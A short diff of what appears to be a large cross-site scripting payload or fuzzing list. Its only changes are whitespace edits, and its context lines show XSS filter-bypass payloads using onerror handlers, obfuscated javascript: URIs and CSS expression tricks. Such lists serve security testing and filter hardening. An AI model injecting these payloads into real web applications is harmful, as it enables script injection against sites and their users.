@@ -1792,7 +1792,7 @@ echo('IPT&gt;alert(1)&lt;/SCRIPT&gt;'); ?&gt;
 <style><img src="</style><img src=x onerror=alert(1)//">
 "><style><img src="</style><img src=x onerror=alert(1)//">
 '><style><img src="</style><img src=x onerror=alert(1)//">
-<li style=list-style:url() onerror=alert(1)></li> 
+<li style=list-style:url() onerror=alert(1)></li>
 "><li style=list-style:url() onerror=alert(1)></li> 
 '><li style=list-style:url() onerror=alert(1)></li> 
 <div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=alert(1)>
@@ -2661,6 +2661,7 @@ exp/*<A STYLE='no\X:noX("*//*");X:ex/*X*//*/*/pression(alert("X"))'>
 "><a href="javas\x04cript:javascript:alert(1)" id="fuzzelement1">test</a>
 '><a href="javas\x04cript:javascript:alert(1)" id="fuzzelement1">test</a>
 <a href="javas\x01cript:javascript:alert(1)" id="fuzzelement1">test</a>
+
 "><a href="javas\x01cript:javascript:alert(1)" id="fuzzelement1">test</a>
 '><a href="javas\x01cript:javascript:alert(1)" id="fuzzelement1">test</a>
 <a href="javas\x05cript:javascript:alert(1)" id="fuzzelement1">test</a>
